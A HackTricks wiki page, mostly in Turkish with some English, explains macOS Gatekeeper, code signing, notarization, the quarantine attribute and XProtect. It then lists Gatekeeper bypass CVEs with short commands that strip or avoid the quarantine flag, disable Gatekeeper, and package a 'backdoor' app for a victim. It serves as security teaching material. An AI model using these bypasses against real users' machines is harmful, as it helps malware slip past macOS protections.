# macOS Gatekeeper / Quarantine / XProtect

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Gatekeeper

**Gatekeeper**, Mac işletim sistemleri için geliştirilmiş bir güvenlik özelliğidir ve kullanıcıların sistemlerinde **yalnızca güvenilir yazılımları çalıştırmalarını** sağlamak için tasarlanmıştır. Kullanıcıların **App Store dışındaki kaynaklardan** indirdiği ve açmaya çalıştığı yazılımları **doğrulayarak** çalışır; bu kaynaklar arasında bir uygulama, eklenti veya yükleyici paketi bulunur.

Gatekeeper'ın ana mekanizması, **doğrulama** sürecindedir. İndirilen yazılımın **tanınmış bir geliştirici tarafından imzalanıp imzalanmadığını** kontrol eder ve yazılımın özgünlüğünü sağlar. Ayrıca, yazılımın **Apple tarafından noterlenip noterlenmediğini** belirler; bu, yazılımın bilinen kötü amaçlı içerikten arındırıldığını ve noterlikten sonra değiştirilmediğini doğrular.

Ayrıca, Gatekeeper, kullanıcıların indirdikleri yazılımları ilk kez açmalarını onaylamaları için **kullanıcılara onay istemi** göndererek kullanıcı kontrolünü ve güvenliğini artırır. Bu koruma, kullanıcıların yanlışlıkla zararlı olabilecek çalıştırılabilir kodları, zararsız bir veri dosyası olarak yanlış anlamalarını önlemeye yardımcı olur.

### Uygulama İmzaları

Uygulama imzaları, kod imzaları olarak da bilinir ve Apple'ın güvenlik altyapısının kritik bir bileşenidir. Yazılım yazarının (geliştiricinin) kimliğini **doğrulamak** ve kodun en son imzalandığı tarihten bu yana değiştirilmediğini sağlamak için kullanılır.

İşte nasıl çalıştığı:

1. **Uygulamayı İmzalama:** Bir geliştirici uygulamasını dağıtmaya hazır olduğunda, **uygulamayı özel bir anahtar kullanarak imzalar**. Bu özel anahtar, geliştirici Apple Geliştirici Programı'na kaydolduğunda Apple tarafından kendisine verilen bir **sertifika ile ilişkilidir**. İmzalama süreci, uygulamanın tüm parçalarının kriptografik bir hash'ini oluşturmayı ve bu hash'i geliştiricinin özel anahtarıyla şifrelemeyi içerir.
2. **Uygulamayı Dağıtma:** İmzalanmış uygulama, geliştiricinin sertifikasıyla birlikte kullanıcılara dağıtılır; bu sertifika, ilgili genel anahtarı içerir.
3. **Uygulamayı Doğrulama:** Bir kullanıcı uygulamayı indirip çalıştırmaya çalıştığında, Mac işletim sistemi geliştiricinin sertifikasından genel anahtarı kullanarak hash'i çözer. Ardından, uygulamanın mevcut durumu temelinde hash'i yeniden hesaplar ve bu değeri çözülen hash ile karşılaştırır. Eğer eşleşiyorsa, bu, **uygulamanın geliştirici tarafından imzalandığı tarihten bu yana değiştirilmediği** anlamına gelir ve sistem uygulamanın çalışmasına izin verir.

Uygulama imzaları, Apple'ın Gatekeeper teknolojisinin temel bir parçasıdır. Bir kullanıcı **internetten indirilen bir uygulamayı açmaya çalıştığında**, Gatekeeper uygulama imzasını doğrular. Eğer imza, Apple tarafından tanınmış bir geliştiriciye verilen bir sertifika ile imzalanmışsa ve kod değiştirilmemişse, Gatekeeper uygulamanın çalışmasına izin verir. Aksi takdirde, uygulamayı engeller ve kullanıcıyı uyarır.

macOS Catalina'dan itibaren, **Gatekeeper ayrıca uygulamanın Apple tarafından noterlenip noterlenmediğini** kontrol eder ve bu, ek bir güvenlik katmanı ekler. Noterlik süreci, uygulamayı bilinen güvenlik sorunları ve kötü amaçlı kod için kontrol eder ve bu kontroller geçerse, Apple uygulamaya Gatekeeper'ın doğrulayabileceği bir bilet ekler.

#### İmzaları Kontrol Etme

Bazı **kötü amaçlı yazılım örneklerini** kontrol ederken, her zaman **ikili dosyanın imzasını kontrol etmelisiniz** çünkü imzayı atan **geliştirici** zaten **kötü amaçlı yazılımla ilişkili** olabilir.
```bash
# Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

# Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

# Get entitlements from the binary
codesign -d --entitlements :- /System/Applications/Automator.app # Check the TCC perms

# Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app

# Sign a binary
codesign -s <cert-name-keychain> toolsdemo
```
### Notarization

Apple'ın notarizasyon süreci, kullanıcıları potansiyel olarak zararlı yazılımlardan korumak için ek bir güvenlik önlemi olarak hizmet eder. Bu süreç, **geliştiricinin uygulamasını** **Apple'ın Noter Servisi** tarafından incelenmek üzere göndermesini içerir; bu, App Review ile karıştırılmamalıdır. Bu hizmet, **kötü amaçlı içerik** ve kod imzalama ile ilgili olası sorunlar için gönderilen yazılımı inceleyen **otomatik bir sistemdir**.

Eğer yazılım, herhangi bir endişe yaratmadan bu incelemeyi **geçerse**, Noter Servisi bir notarizasyon belgesi oluşturur. Geliştiricinin, bu belgeyi yazılımlarına **eklemesi** gerekmektedir; bu işleme 'stapling' denir. Ayrıca, notarizasyon belgesi çevrimiçi olarak da yayınlanır ve Gatekeeper, Apple'ın güvenlik teknolojisi, buna erişebilir.

Kullanıcının yazılımı ilk yüklemesi veya çalıştırması sırasında, notarizasyon belgesinin varlığı - ister çalıştırılabilir dosyaya eklenmiş olsun, ister çevrimiçi bulunsun - **Gatekeeper'a yazılımın Apple tarafından notarize edildiğini bildirir**. Sonuç olarak, Gatekeeper, yazılımın Apple tarafından kötü amaçlı içerik için kontrol edildiğini belirten açıklayıcı bir mesajı ilk başlatma iletişim kutusunda gösterir. Bu süreç, kullanıcıların sistemlerine yükledikleri veya çalıştırdıkları yazılımların güvenliğine olan güvenini artırır.

### spctl & syspolicyd

{% hint style="danger" %}
Sequoia sürümünden itibaren, **`spctl`** artık Gatekeeper yapılandırmasını değiştirmeye izin vermemektedir.
{% endhint %}

**`spctl`**, Gatekeeper ile etkileşimde bulunmak ve onu listelemek için CLI aracıdır (XPC mesajları aracılığıyla `syspolicyd` daemon'u ile). Örneğin, GateKeeper'ın **durumunu** görmek mümkündür:
```bash
# Check the status
spctl --status
```
{% hint style="danger" %}
GateKeeper imza kontrollerinin yalnızca **Quarantine niteliğine sahip dosyalar** için gerçekleştirildiğini, her dosya için değil, unutmayın.
{% endhint %}

GateKeeper, **tercihler ve imza** doğrultusunda bir ikili dosyanın çalıştırılıp çalıştırılamayacağını kontrol edecektir:

<figure><img src="../../../.gitbook/assets/image (1150).png" alt=""><figcaption></figcaption></figure>

**`syspolicyd`** Gatekeeper'ı uygulamaktan sorumlu ana daemon'dur. `/var/db/SystemPolicy` konumunda bir veritabanı tutar ve [veritabanını destekleyen kodu burada](https://opensource.apple.com/source/Security/Security-58286.240.4/OSX/libsecurity\_codesigning/lib/policydb.cpp) ve [SQL şablonunu burada](https://opensource.apple.com/source/Security/Security-58286.240.4/OSX/libsecurity\_codesigning/lib/syspolicy.sql) bulmak mümkündür. Veritabanının SIP tarafından kısıtlanmadığını ve root tarafından yazılabilir olduğunu unutmayın; ayrıca `/var/db/.SystemPolicy-default` veritabanı, diğerinin bozulması durumunda orijinal bir yedek olarak kullanılmaktadır.

Ayrıca, **`/var/db/gke.bundle`** ve **`/var/db/gkopaque.bundle`** dosyaları, veritabanına eklenen kurallarla birlikte dosyalar içerir. Bu veritabanını root olarak kontrol edebilirsiniz:
```bash
# Open database
sqlite3 /var/db/SystemPolicy

# Get allowed rules
SELECT requirement,allow,disabled,label from authority where label != 'GKE' and disabled=0;
requirement|allow|disabled|label
anchor apple generic and certificate 1[subject.CN] = "Apple Software Update Certification Authority"|1|0|Apple Installer
anchor apple|1|0|Apple System
anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] exists|1|0|Mac App Store
anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] exists and (certificate leaf[field.1.2.840.113635.100.6.1.14] or certificate leaf[field.1.2.840.113635.100.6.1.13]) and notarized|1|0|Notarized Developer ID
[...]
```
**`syspolicyd`** ayrıca `assess`, `update`, `record` ve `cancel` gibi farklı işlemlerle bir XPC sunucusu sunar; bunlara **`Security.framework`'ün `SecAssessment*`** API'leri aracılığıyla da erişilebilir ve **`xpctl`** aslında **`syspolicyd`** ile XPC üzerinden iletişim kurar.

İlk kuralın "**App Store**" ile ve ikinci kuralın "**Developer ID**" ile bittiğine ve önceki görüntüde **App Store ve tanımlı geliştiricilerden uygulama çalıştırma** izninin **etkin** olduğuna dikkat edin.\
Eğer o ayarı App Store olarak **değiştirirseniz**, "**Notarized Developer ID" kuralları kaybolacaktır**.

Ayrıca **tip GKE** olan binlerce kural da bulunmaktadır:
```bash
SELECT requirement,allow,disabled,label from authority where label = 'GKE' limit 5;
cdhash H"b40281d347dc574ae0850682f0fd1173aa2d0a39"|1|0|GKE
cdhash H"5fd63f5342ac0c7c0774ebcbecaf8787367c480f"|1|0|GKE
cdhash H"4317047eefac8125ce4d44cab0eb7b1dff29d19a"|1|0|GKE
cdhash H"0a71962e7a32f0c2b41ddb1fb8403f3420e1d861"|1|0|GKE
cdhash H"8d0d90ff23c3071211646c4c9c607cdb601cb18f"|1|0|GKE
```
Bunlar şunlardan elde edilen hash'lerdir:

* `/var/db/SystemPolicyConfiguration/gke.bundle/Contents/Resources/gke.auth`
* `/var/db/gke.bundle/Contents/Resources/gk.db`
* `/var/db/gkopaque.bundle/Contents/Resources/gkopaque.db`

Ya da önceki bilgileri şu şekilde listeleyebilirsiniz:
```bash
sudo spctl --list
```
The options **`--master-disable`** and **`--global-disable`** of **`spctl`** will completely **devre dışı bırakmak** these signature checks:
```bash
# Disable GateKeeper
spctl --global-disable
spctl --master-disable

# Enable it
spctl --global-enable
spctl --master-enable
```
Tamamen etkinleştirildiğinde, yeni bir seçenek görünecektir:

<figure><img src="../../../.gitbook/assets/image (1151).png" alt=""><figcaption></figcaption></figure>

**GateKeeper tarafından bir Uygulamanın izin verilip verilmeyeceğini kontrol etmek mümkündür**:
```bash
spctl --assess -v /Applications/App.app
```
GateKeeper'da belirli uygulamaların çalıştırılmasına izin vermek için yeni kurallar eklemek mümkündür:
```bash
# Check if allowed - nop
spctl --assess -v /Applications/App.app
/Applications/App.app: rejected
source=no usable signature

# Add a label and allow this label in GateKeeper
sudo spctl --add --label "whitelist" /Applications/App.app
sudo spctl --enable --label "whitelist"

# Check again - yep
spctl --assess -v /Applications/App.app
/Applications/App.app: accepted
```
Regarding **kernel extensions**, the folder `/var/db/SystemPolicyConfiguration` contains files with lists of kexts allowed to be loaded. Moreover, `spctl` has the entitlement `com.apple.private.iokit.nvram-csr` because it's capable of  adding new pre-approved kernel extensions which need to be saved also in NVRAM in a `kext-allowed-teams` key.

### Quarantine Files

Upon **downloading** an application or file, specific macOS **applications** such as web browsers or email clients **attach an extended file attribute**, commonly known as the "**quarantine flag**," to the downloaded file. This attribute acts as a security measure to **mark the file** as coming from an untrusted source (the internet), and potentially carrying risks. However, not all applications attach this attribute, for instance, common BitTorrent client software usually bypasses this process.

**The presence of a quarantine flag signals macOS's Gatekeeper security feature when a user attempts to execute the file**.

In the case where the **quarantine flag is not present** (as with files downloaded via some BitTorrent clients), Gatekeeper's **checks may not be performed**. Thus, users should exercise caution when opening files downloaded from less secure or unknown sources.

{% hint style="info" %}
**Kod imzalarının** **geçerliliğini kontrol etmek**, kodun ve tüm paketlenmiş kaynaklarının kriptografik **hash'lerini** oluşturmayı içeren **kaynak yoğun** bir süreçtir. Ayrıca, sertifika geçerliliğini kontrol etmek, verildiği tarihten sonra iptal edilip edilmediğini görmek için Apple'ın sunucularında **çevrimiçi kontrol** yapmayı gerektirir. Bu nedenlerden dolayı, her uygulama başlatıldığında tam bir kod imzası ve notlandırma kontrolü **pratik değildir**.

Bu nedenle, bu kontroller **yalnızca karantinaya alınmış niteliğe sahip uygulamalar çalıştırıldığında** gerçekleştirilir.
{% endhint %}

{% hint style="warning" %}
Bu nitelik, dosyayı oluşturan/indiren **uygulama tarafından ayarlanmalıdır**.

Ancak, sandbox'lanmış dosyalar, oluşturdukları her dosya için bu niteliği alacaktır. Ve sandbox'lanmamış uygulamalar bunu kendileri ayarlayabilir veya sistemin oluşturulan dosyalara `com.apple.quarantine` genişletilmiş niteliğini ayarlamasını sağlayacak **Info.plist** dosyasında [**LSFileQuarantineEnabled**](https://developer.apple.com/documentation/bundleresources/information_property_list/lsfilequarantineenabled?language=objc) anahtarını belirtebilirler.
{% endhint %}

Moreover, all files created by a process calling **`qtn_proc_apply_to_self`** are quarantined. Or the API **`qtn_file_apply_to_path`** adds the quarantine attribute to a specified file path.

It's possible to **check it's status and enable/disable** (root required) with:
```bash
spctl --status
assessments enabled

spctl --enable
spctl --disable
#You can also allow nee identifies to execute code using the binary "spctl"
```
Ayrıca bir dosyanın karantina genişletilmiş niteliğine sahip olup olmadığını **şu komutla bulabilirsiniz**:
```bash
xattr file.png
com.apple.macl
com.apple.quarantine
```
**Genişletilmiş** **özelliklerin** **değerini** kontrol edin ve karantina özelliğini yazan uygulamayı bulun:
```bash
xattr -l portada.png
com.apple.macl:
00000000  03 00 53 DA 55 1B AE 4C 4E 88 9D CA B7 5C 50 F3  |..S.U..LN.....P.|
00000010  16 94 03 00 27 63 64 97 98 FB 4F 02 84 F3 D0 DB  |....'cd...O.....|
00000020  89 53 C3 FC 03 00 27 63 64 97 98 FB 4F 02 84 F3  |.S....'cd...O...|
00000030  D0 DB 89 53 C3 FC 00 00 00 00 00 00 00 00 00 00  |...S............|
00000040  00 00 00 00 00 00 00 00                          |........|
00000048
com.apple.quarantine: 00C1;607842eb;Brave;F643CD5F-6071-46AB-83AB-390BA944DEC5
# 00c1 -- It has been allowed to eexcute this file (QTN_FLAG_USER_APPROVED = 0x0040)
# 607842eb -- Timestamp
# Brave -- App
# F643CD5F-6071-46AB-83AB-390BA944DEC5 -- UID assigned to the file downloaded
```
Aslında bir süreç "oluşturduğu dosyalara karantina bayrakları ayarlayabilir" (oluşturulan bir dosyada USER_APPROVED bayrağını uygulamaya çalıştım ama uygulayamadım):

<details>

<summary>Kaynak Kod karantina bayraklarını uygula</summary>
```c
#include <stdio.h>
#include <stdlib.h>

enum qtn_flags {
QTN_FLAG_DOWNLOAD = 0x0001,
QTN_FLAG_SANDBOX = 0x0002,
QTN_FLAG_HARD = 0x0004,
QTN_FLAG_USER_APPROVED = 0x0040,
};

#define qtn_proc_alloc _qtn_proc_alloc
#define qtn_proc_apply_to_self _qtn_proc_apply_to_self
#define qtn_proc_free _qtn_proc_free
#define qtn_proc_init _qtn_proc_init
#define qtn_proc_init_with_self _qtn_proc_init_with_self
#define qtn_proc_set_flags _qtn_proc_set_flags
#define qtn_file_alloc _qtn_file_alloc
#define qtn_file_init_with_path _qtn_file_init_with_path
#define qtn_file_free _qtn_file_free
#define qtn_file_apply_to_path _qtn_file_apply_to_path
#define qtn_file_set_flags _qtn_file_set_flags
#define qtn_file_get_flags _qtn_file_get_flags
#define qtn_proc_set_identifier _qtn_proc_set_identifier

typedef struct _qtn_proc *qtn_proc_t;
typedef struct _qtn_file *qtn_file_t;

int qtn_proc_apply_to_self(qtn_proc_t);
void qtn_proc_init(qtn_proc_t);
int qtn_proc_init_with_self(qtn_proc_t);
int qtn_proc_set_flags(qtn_proc_t, uint32_t flags);
qtn_proc_t qtn_proc_alloc();
void qtn_proc_free(qtn_proc_t);
qtn_file_t qtn_file_alloc(void);
void qtn_file_free(qtn_file_t qf);
int qtn_file_set_flags(qtn_file_t qf, uint32_t flags);
uint32_t qtn_file_get_flags(qtn_file_t qf);
int qtn_file_apply_to_path(qtn_file_t qf, const char *path);
int qtn_file_init_with_path(qtn_file_t qf, const char *path);
int qtn_proc_set_identifier(qtn_proc_t qp, const char* bundleid);

int main() {

qtn_proc_t qp = qtn_proc_alloc();
qtn_proc_set_identifier(qp, "xyz.hacktricks.qa");
qtn_proc_set_flags(qp, QTN_FLAG_DOWNLOAD | QTN_FLAG_USER_APPROVED);
qtn_proc_apply_to_self(qp);
qtn_proc_free(qp);

FILE *fp;
fp = fopen("thisisquarantined.txt", "w+");
fprintf(fp, "Hello Quarantine\n");
fclose(fp);

return 0;

}
```
</details>

Ve o niteliği **kaldır**:
```bash
xattr -d com.apple.quarantine portada.png
#You can also remove this attribute from every file with
find . -iname '*' -print0 | xargs -0 xattr -d com.apple.quarantine
```
Ve karantinaya alınmış tüm dosyaları bulmak için: 

{% code overflow="wrap" %}
```bash
find / -exec ls -ld {} \; 2>/dev/null | grep -E "[x\-]@ " | awk '{printf $9; printf "\n"}' | xargs -I {} xattr -lv {} | grep "com.apple.quarantine"
```
{% endcode %}

Karantina bilgileri, dosya kökenleri hakkında veri elde etmek için GUI'nin erişim sağladığı **`~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2`** tarafından yönetilen merkezi bir veritabanında da saklanır. Ayrıca, kökenlerini gizlemekle ilgilenen uygulamalar tarafından üzerine yazılabilir. Bu, LaunchServices API'leri aracılığıyla da yapılabilir.

#### **libquarantine.dylb**

Bu kütüphane, genişletilmiş nitelik alanlarını manipüle etmeye olanak tanıyan birkaç işlevi dışa aktarır.

`qtn_file_*` API'leri dosya karantina politikalarıyla, `qtn_proc_*` API'leri ise süreçlere (süreç tarafından oluşturulan dosyalar) uygulanır. Dışa aktarılmamış `__qtn_syscall_quarantine*` işlevleri, `mac_syscall`'ı "Karantina" ilk argüman olarak çağıran ve istekleri `Quarantine.kext`'e gönderen politikaları uygulayanlardır.

#### **Quarantine.kext**

Çekirdek uzantısı yalnızca **sistemdeki çekirdek önbelleği** aracılığıyla mevcuttur; ancak, **Kernel Debug Kit'i** [**https://developer.apple.com/**](https://developer.apple.com/) adresinden indirebilirsiniz, bu uzantının sembolik versiyonunu içerecektir.

Bu Kext, tüm dosya yaşam döngüsü olaylarını yakalamak için MACF aracılığıyla birkaç çağrıyı bağlayacaktır: Oluşturma, açma, yeniden adlandırma, sert bağlantı oluşturma... hatta `setxattr`'ı kullanarak `com.apple.quarantine` genişletilmiş niteliğini ayarlamasını engellemek için.

Ayrıca birkaç MIB kullanır:

* `security.mac.qtn.sandbox_enforce`: Sandbox ile birlikte karantina uygulamak
* `security.mac.qtn.user_approved_exec`: Karantinaya alınmış süreçler yalnızca onaylı dosyaları çalıştırabilir

### XProtect

XProtect, macOS'ta yerleşik bir **kötü amaçlı yazılım karşıtı** özelliktir. XProtect, **herhangi bir uygulamayı ilk kez başlatıldığında veya değiştirildiğinde bilinen kötü amaçlı yazılımlar ve güvensiz dosya türleri veritabanıyla kontrol eder**. Safari, Mail veya Mesajlar gibi belirli uygulamalar aracılığıyla bir dosya indirdiğinizde, XProtect otomatik olarak dosyayı tarar. Eğer dosya veritabanındaki bilinen kötü amaçlı yazılımlardan herhangi biriyle eşleşirse, XProtect **dosyanın çalışmasını engeller** ve sizi tehdit hakkında uyarır.

XProtect veritabanı, Apple tarafından **düzenli olarak** yeni kötü amaçlı yazılım tanımlarıyla güncellenir ve bu güncellemeler otomatik olarak Mac'inize indirilip yüklenir. Bu, XProtect'in her zaman en son bilinen tehditlerle güncel olmasını sağlar.

Ancak, **XProtect'in tam özellikli bir antivirüs çözümü olmadığını** belirtmekte fayda var. Sadece bilinen tehditlerin belirli bir listesini kontrol eder ve çoğu antivirüs yazılımı gibi erişim taraması yapmaz.

En son XProtect güncellemesi hakkında bilgi almak için çalıştırabilirsiniz:

{% code overflow="wrap" %}
```bash
system_profiler SPInstallHistoryDataType 2>/dev/null | grep -A 4 "XProtectPlistConfigData" | tail -n 5
```
{% endcode %}

XProtect, **/Library/Apple/System/Library/CoreServices/XProtect.bundle** konumunda SIP korumalı bir alanda bulunmaktadır ve bundle içinde XProtect'in kullandığı bilgileri bulabilirsiniz:

* **`XProtect.bundle/Contents/Resources/LegacyEntitlementAllowlist.plist`**: Bu cdhash'lere sahip kodların eski yetkilendirmeleri kullanmasına izin verir.
* **`XProtect.bundle/Contents/Resources/XProtect.meta.plist`**: BundleID ve TeamID aracılığıyla yüklenmesine izin verilmeyen eklentilerin ve uzantıların listesi veya minimum sürümü belirtir.
* **`XProtect.bundle/Contents/Resources/XProtect.yara`**: Kötü amaçlı yazılımları tespit etmek için Yara kuralları.
* **`XProtect.bundle/Contents/Resources/gk.db`**: Engellenen uygulamaların ve TeamID'lerin hash'lerini içeren SQLite3 veritabanı.

**`/Library/Apple/System/Library/CoreServices/XProtect.app`** konumunda, Gatekeeper süreciyle ilgili olmayan başka bir XProtect uygulaması olduğunu unutmayın.

### Not Gatekeeper

{% hint style="danger" %}
Gatekeeper'ın **her seferinde** bir uygulama çalıştırdığınızda **çalıştırılmadığını** unutmayın, sadece _**AppleMobileFileIntegrity**_ (AMFI) yalnızca Gatekeeper tarafından daha önce çalıştırılmış ve doğrulanmış bir uygulamayı çalıştırdığınızda **yürütülebilir kod imzalarını** **doğrular.**
{% endhint %}

Bu nedenle, daha önce bir uygulamayı çalıştırarak Gatekeeper ile önbelleğe almak, ardından **uygulamanın yürütülebilir olmayan dosyalarını değiştirmek** (Electron asar veya NIB dosyaları gibi) mümkündü ve başka korumalar yoksa, uygulama **kötü amaçlı** eklemelerle **çalıştırılıyordu.**

Ancak, şimdi bu mümkün değil çünkü macOS **uygulama paketleri içindeki dosyaların değiştirilmesini engelliyor.** Yani, [Dirty NIB](../macos-proces-abuse/macos-dirty-nib.md) saldırısını denerseniz, Gatekeeper ile önbelleğe almak için uygulamayı çalıştırdıktan sonra paketi değiştiremeyeceğinizi göreceksiniz. Örneğin, İçerikler dizisinin adını NotCon olarak değiştirirseniz (saldırıda belirtildiği gibi) ve ardından uygulamanın ana ikili dosyasını Gatekeeper ile önbelleğe almak için çalıştırırsanız, bir hata tetiklenecek ve çalıştırılmayacaktır.

## Gatekeeper Atlatmaları

Gatekeeper'ı atlatmanın (kullanıcının bir şey indirmesini ve Gatekeeper'ın engellemesi gereken bir şeyi çalıştırmasını sağlamak) herhangi bir yolu, macOS'ta bir güvenlik açığı olarak kabul edilir. Geçmişte Gatekeeper'ı atlatmaya izin veren bazı tekniklere atanmış CVE'ler şunlardır:

### [CVE-2021-1810](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810)

**Archive Utility** kullanılarak çıkarma yapıldığında, **886 karakteri aşan yollar** olan dosyaların com.apple.quarantine genişletilmiş niteliğini almadığı gözlemlendi. Bu durum, bu dosyaların **Gatekeeper'ın** güvenlik kontrollerini **aşmasına** neden olmaktadır.

Daha fazla bilgi için [**orijinal raporu**](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810) kontrol edin.

### [CVE-2021-30990](https://ronmasas.com/posts/bypass-macos-gatekeeper)

Bir uygulama **Automator** ile oluşturulduğunda, çalıştırmak için gereken bilgiler `application.app/Contents/document.wflow` içinde bulunur, yürütülebilir dosyada değil. Yürütülebilir dosya, **Automator Application Stub** adı verilen genel bir Automator ikili dosyasıdır.

Bu nedenle, `application.app/Contents/MacOS/Automator\ Application\ Stub` **sistem içindeki başka bir Automator Application Stub'a sembolik bir bağlantı ile işaret edebilir** ve `document.wflow` (sizin script'iniz) içindekileri **Gatekeeper'ı tetiklemeksizin çalıştırır** çünkü gerçek yürütülebilir dosya karantina xattr'ına sahip değildir.

Beklenen konum örneği: `/System/Library/CoreServices/Automator\ Application\ Stub.app/Contents/MacOS/Automator\ Application\ Stub`

Daha fazla bilgi için [**orijinal raporu**](https://ronmasas.com/posts/bypass-macos-gatekeeper) kontrol edin.

### [CVE-2022-22616](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/)

Bu atlatmada, `application.app/Contents`'den sıkıştırmaya başlayan bir uygulama ile bir zip dosyası oluşturuldu, `application.app` yerine. Bu nedenle, **karantina niteliği** tüm **`application.app/Contents`** dosyalarına uygulandı ancak **`application.app`**'ye uygulanmadı, bu da Gatekeeper'ın kontrol ettiği yerdi, bu nedenle Gatekeeper atlatıldı çünkü `application.app` tetiklendiğinde **karantina niteliğine sahip değildi.**
```bash
zip -r test.app/Contents test.zip
```
Check the [**original report**](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/) for more information.

### [CVE-2022-32910](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32910)

Bileşenler farklı olsa da, bu güvenlik açığının istismarı öncekiyle çok benzer. Bu durumda, **`application.app/Contents`**'dan bir Apple Archive oluşturacağız, böylece **`application.app`** **Archive Utility** tarafından açıldığında karantina özelliğini almayacak.
```bash
aa archive -d test.app/Contents -o test.app.aar
```
Check the [**original report**](https://www.jamf.com/blog/jamf-threat-labs-macos-archive-utility-vulnerability/) for more information.

### [CVE-2022-42821](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)

ACL **`writeextattr`** bir dosyada bir niteliğin yazılmasını önlemek için kullanılabilir:
```bash
touch /tmp/no-attr
chmod +a "everyone deny writeextattr" /tmp/no-attr
xattr -w attrname vale /tmp/no-attr
xattr: [Errno 13] Permission denied: '/tmp/no-attr'
```
Ayrıca, **AppleDouble** dosya formatı, bir dosyayı ACE'leri ile birlikte kopyalar.

[**kaynak kodunda**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) **`com.apple.acl.text`** adlı xattr içinde saklanan ACL metin temsilinin, açılmış dosyada ACL olarak ayarlanacağını görebilirsiniz. Yani, bir uygulamayı ACL'nin diğer xattr'lerin yazılmasını engellediği bir zip dosyasına **AppleDouble** dosya formatı ile sıkıştırdıysanız... karantina xattr uygulamaya ayarlanmamıştı:

{% code overflow="wrap" %}
```bash
chmod +a "everyone deny write,writeattr,writeextattr" /tmp/test
ditto -c -k test test.zip
python3 -m http.server
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr
```
{% endcode %}

Daha fazla bilgi için [**orijinal raporu**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) kontrol edin.

Bunun AppleArchives ile de istismar edilebileceğini unutmayın:
```bash
mkdir app
touch app/test
chmod +a "everyone deny write,writeattr,writeextattr" app/test
aa archive -d app -o test.aar
```
### [CVE-2023-27943](https://blog.f-secure.com/discovery-of-gatekeeper-bypass-cve-2023-27943/)

**Google Chrome'un indirilen dosyalar için karantina niteliğini ayarlamadığı** bazı macOS iç sorunları nedeniyle keşfedildi.

### [CVE-2023-27951](https://redcanary.com/blog/gatekeeper-bypass-vulnerabilities/)

AppleDouble dosya formatları, bir dosyanın niteliklerini `._` ile başlayan ayrı bir dosyada saklar, bu da dosya niteliklerini **macOS makineleri arasında kopyalamaya** yardımcı olur. Ancak, bir AppleDouble dosyası açıldıktan sonra, `._` ile başlayan dosyanın **karantina niteliği verilmediği** fark edildi.

{% code overflow="wrap" %}
```bash
mkdir test
echo a > test/a
echo b > test/b
echo ._a > test/._a
aa archive -d test/ -o test.aar

# If you downloaded the resulting test.aar and decompress it, the file test/._a won't have a quarantitne attribute
```
{% endcode %}

Karantina niteliği ayarlanmamış bir dosya oluşturabilmek, **Gatekeeper'ı atlatmayı mümkün kıldı.** Hile, **AppleDouble adlandırma kuralını** kullanarak bir **DMG dosya uygulaması** oluşturmak ve karantina niteliği olmayan bu gizli dosyaya **görünür bir dosya olarak sembolik bağlantı** oluşturmaktı.\
**Dmg dosyası çalıştırıldığında**, karantina niteliği olmadığı için **Gatekeeper'ı atlatacaktır.**
```bash
# Create an app bundle with the backdoor an call it app.app

echo "[+] creating disk image with app"
hdiutil create -srcfolder app.app app.dmg

echo "[+] creating directory and files"
mkdir
mkdir -p s/app
cp app.dmg s/app/._app.dmg
ln -s ._app.dmg s/app/app.dmg

echo "[+] compressing files"
aa archive -d s/ -o app.aar
```
### uchg (from this [talk](https://codeblue.jp/2023/result/pdf/cb23-bypassing-macos-security-and-privacy-mechanisms-from-gatekeeper-to-system-integrity-protection-by-koh-nakagawa.pdf))

* Bir uygulama içeren bir dizin oluşturun.
* Uygulamaya uchg ekleyin.
* Uygulamayı tar.gz dosyasına sıkıştırın.
* Tar.gz dosyasını bir kurbanına gönderin.
* Kurban tar.gz dosyasını açar ve uygulamayı çalıştırır.
* Gatekeeper uygulamayı kontrol etmez.

### Quarantine xattr'ı Önleme

Bir ".app" paketinde, karantina xattr eklenmemişse, çalıştırıldığında **Gatekeeper tetiklenmeyecek**.

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
